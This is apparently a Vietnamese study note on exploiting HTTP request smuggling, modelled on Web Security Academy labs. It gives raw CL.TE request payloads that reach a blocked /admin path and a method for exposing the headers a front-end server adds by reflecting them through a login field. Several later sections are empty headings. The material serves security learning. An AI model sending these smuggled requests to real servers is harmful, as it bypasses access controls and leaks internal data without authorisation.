# Exploiting HTTP request smuggling vulnerabilities.

## Using HTTP request smuggling to bypass front-end security controls.

- Trong một số ứng dụng, máy chủ web front-end được sử dụng để triển khai một số kiểm soát bảo mật, quyết định xem có cho phép xử lý các yêu cầu riêng lẻ hay không. Các yêu cầu được phép sẽ được chuyển tiếp đến máy chủ back-end, nơi chúng được coi là đã vượt qua các điều khiển front-end.

- Giả sử người dùng hiện tại được phép truy cập */home*, nhưng không được truy cập */admin*. Họ có thể bỏ qua hạn chế này bằng cách sử dụng cuộc tấn công request smuggling sau:
```
POST /home HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 62
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Foo: xGET /home HTTP/1.1
Host: vulnerable-website.com
```
 
 - Lab:
 	+ Lab: Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability.[exploit](exploit/lab6.txt)
 	+ Lab: Lab: Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability.[exploit](exploit/lab7.txt)

## Revealing front-end request rewriting.

- Trong nhiều ứng dụng, máy chủ front-end thực hiện một số việc viết lại các yêu cầu trước khi chúng được chuyển tiếp đến máy chủ back-end, thường bằng cách thêm một số tiêu đề yêu cầu bổ sung.
- Trong một số tình huống, payload request smuggling của bạn thiếu một số tiêu đề thường được thêm bởi máy chủ front-end, thì máy chủ back-end có thể không xử lý các yêu cầu theo cách bình thường, dẫn đến không đạt được hiệu quả như mong muốn.
 
- Thường có một cách đơn giản để tiết lộ chính xác cách máy chủ front-end đang viết lại các yêu cầu.

	+ Tìm một yêu cầu POST phản ánh giá trị của tham số yêu cầu vào phản hồi của ứng dụng.
	+ Xáo trộn các tham số để tham số được phản ánh xuất hiện cuối cùng trong nội dung thư.
	+ Chuyển yêu cầu này đến máy chủ back-end, theo sau trực tiếp là một yêu cầu bình thường có biểu mẫu được viết lại mà bạn muốn tiết lộ.

- Ví dụ:
```
POST /login HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 28

email=wiener@normal-user.net
```

> <input id="email" value="wiener@normal-user.net" type="text">

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Transfer-Encoding: chunked

0

POST /login HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

email=POST /login HTTP/1.1
Host: vulnerable-website.com
...
``` 
- Các yêu cầu sẽ được máy chủ front-end viết lại để bao gồm các tiêu đề bổ sung, sau đó máy chủ back-end sẽ xử lý request smuggling và coi yêu cầu thứ hai được viết lại là giá trị của email. Sau đó, nó sẽ phản ánh giá trị này trở lại trong phản hồi cho yêu cầu thứ hai:

```
<input id="email" value="POST /login HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-For: 1.3.3.7
X-Forwarded-Proto: https
X-TLS-Bits: 128
X-TLS-Cipher: ECDHE-RSA-AES128-GCM-SHA256
X-TLS-Version: TLSv1.2
x-nr-external-service: external
...
```

## Bypassing client authentication.


## Capturing other users' requests.


## Using HTTP request smuggling to exploit reflected XSS.

## Using HTTP request smuggling to turn an on-site redirect into an open redirect.

## Using HTTP request smuggling to perform web cache poisoning.

## Using HTTP request smuggling to perform web cache deception.


## 